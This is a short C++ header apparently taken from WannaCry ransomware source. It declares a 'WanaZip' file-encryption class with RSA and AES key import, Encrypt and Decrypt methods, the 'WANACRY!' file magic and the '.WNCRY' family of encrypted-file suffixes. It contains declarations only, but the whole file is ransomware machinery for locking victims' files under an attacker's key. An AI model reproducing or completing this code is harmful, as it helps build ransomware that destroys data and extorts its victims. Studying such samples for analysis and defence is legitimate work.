#pragma once

#include <Windows.h>
#include "../EZCrypt/EZRSA.h"
#include "../EZCrypt/EZAES.h"

#define WZIP_MAGIC "WANACRY!"

#define WZIP_SRCBUFFERSIZE	0x10000
#define WZIP_IOBUFFERSIZE	0x100000

#define DO_NONE	0
#define DO_NOTHING	1
#define DO_DELETE	2
#define DO_WRITESRC	3
#define DO_ENCRYPT	4


#define WZIP_SUFFIX_CIPHER _T(".WNCRY")
#define WZIP_SUFFIX_WRITESRC _T(".WNCYR")
#define WZIP_SUFFIX_TEMP _T(".WNCRYT")

class WanaZip
{
	PEZRSA m_pEncRSA;
	PEZRSA m_pDecRSA;
	PUCHAR m_InBuffer;
	PUCHAR m_OutBuffer;

public:
	WanaZip();
	~WanaZip();
	BOOL ImportPublicKey(PUCHAR, ULONG);
	BOOL ImportPrivateKey(PUCHAR, ULONG);
	BOOL ImportPublicKey(LPCTSTR);
	BOOL ImportPrivateKey(LPCTSTR);
	BOOL Encrypt(LPCTSTR, ULONG);
	BOOL Decrypt(LPCTSTR);
};

typedef WanaZip* PWanaZip;
